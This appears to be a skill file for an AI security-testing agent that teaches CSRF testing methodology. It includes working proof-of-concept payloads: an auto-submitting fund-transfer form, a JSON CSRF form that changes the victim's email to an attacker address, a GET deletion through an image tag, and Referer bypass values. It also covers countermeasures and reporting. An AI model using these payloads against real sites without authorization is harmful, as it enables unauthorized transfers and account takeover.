---
name: csrf-testing
description: Professional techniques and methodology for CSRF (Cross-Site Request Forgery) testing
version: 1.0.0
---

# CSRF (Cross-Site Request Forgery) Testing

## Overview

CSRF (Cross-Site Request Forgery) is an attack that abuses a user's authenticated session to perform unauthorized actions. This skill covers how to detect, exploit, and prevent CSRF vulnerabilities.

## How the Vulnerability Works

- The attacker tricks the user into visiting a malicious page
- The malicious page automatically sends requests to the target site
- The browser automatically attaches the user's credentials (Cookie, Session)
- The target site mistakes the request for a legitimate user action

## Testing Method

### 1. Identify Sensitive Operations

- Password changes
- Email changes
- Fund transfers
- Permission changes
- Data deletion
- State updates

### 2. Detect the CSRF Token

**Check whether token protection exists:**
```html
<!-- With token protection -->
<form method="POST" action="/change-password">
  <input type="hidden" name="csrf_token" value="abc123">
  <input type="password" name="new_password">
</form>

<!-- No token protection - CSRF risk -->
<form method="POST" action="/change-email">
  <input type="email" name="new_email">
</form>
```

### 3. Verify Token Validity

**Test whether the token is predictable:**
- Is the token based on a timestamp?
- Is the token based on the user ID?
- Can the token be reused?
- Is the token shared across multiple requests?

### 4. Check Referer Validation

**Test whether the Referer check can be bypassed:**
```javascript
// Normal request
Referer: https://target.com/change-password

// Bypass attempts
Referer: https://target.com.evil.com
Referer: https://evil.com/?target.com
Referer: (empty)
```

## Exploitation Techniques

### Basic CSRF Attack

**Auto-submitting HTML form:**
```html
<form action="https://target.com/api/transfer" method="POST" id="csrf">
  <input type="hidden" name="to" value="attacker_account">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf').submit();</script>
```

### JSON CSRF

**Bypassing the Content-Type check:**
```html
<!-- Submit JSON via a form -->
<form action="https://target.com/api/update" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>
```

### GET-Based CSRF

**Abusing GET requests:**
```html
<img src="https://target.com/api/delete?id=123">
```

## Bypass Techniques

### Token Bypass

**If the token lives in a Cookie:**
```javascript
// If the token exists in both the Cookie and the form
// try submitting only the Cookie copy
fetch('https://target.com/api/action', {
  method: 'POST',
  credentials: 'include',
  body: 'action=delete&id=123'
  // No csrf_token parameter; relies on the Cookie
});
```

### SameSite Cookie Bypass

**Abusing subdomains:**
- With SameSite=Lax, GET requests still carry Cookies
- Launch the attack from a subdomain

### Double-Submit Cookie

**Bypassing token validation:**
```html
<!-- If the token is in the Cookie and the validation logic is flawed -->
<form action="https://target.com/api/action" method="POST">
  <input type="hidden" name="csrf_token" value="">
  <script>
    // Read the token from the Cookie
    document.cookie.split(';').forEach(c => {
      if(c.trim().startsWith('csrf_token=')) {
        document.querySelector('input[name="csrf_token"]').value = 
          c.split('=')[1];
      }
    });
  </script>
</form>
```

## Tooling

### Burp Suite

**Using the CSRF PoC generator:**
1. Intercept the target request
2. Right-click -> Engagement tools -> Generate CSRF PoC
3. Test the generated PoC

### OWASP ZAP

```bash
# Scan for CSRF with ZAP
zap-cli quick-scan --self-contained --start-options '-config api.disablekey=true' http://target.com
```

## Verification and Reporting

### Verification Steps

1. Confirm the target operation lacks CSRF token protection
2. Craft a malicious request and verify it executes
3. Assess impact (data exposure, privilege escalation, financial loss, etc.)
4. Record a complete PoC
5. Record the confirmed vulnerability in the platform via the `report_finding` tool (the sole entry point for recording findings in this platform), covering location, type, severity, reproduction steps/PoC, and remediation advice

### Reporting Essentials

- Vulnerability location and affected operations
- Attack scenario and impact scope
- Complete exploitation steps and PoC
- Remediation advice (CSRF token, SameSite Cookie, Referer validation, etc.)

## Countermeasures

### Recommended Approaches

1. **CSRF Token**
   - Include a unique token in every form
   - Store the token in the session
   - Validate the token

2. **SameSite Cookie**
   ```javascript
   Set-Cookie: session=abc123; SameSite=Strict; Secure
   ```

3. **Double-Submit Cookie**
   - Keep the token in both the Cookie and the form
   - Verify that the two match

4. **Referer Validation**
   - Verify that the Referer is same-origin
   - Handle empty Referers explicitly

## Notes

- Test only in authorized environments
- Avoid real impact on user accounts
- Record every testing step
- Account for behavioral differences across browsers
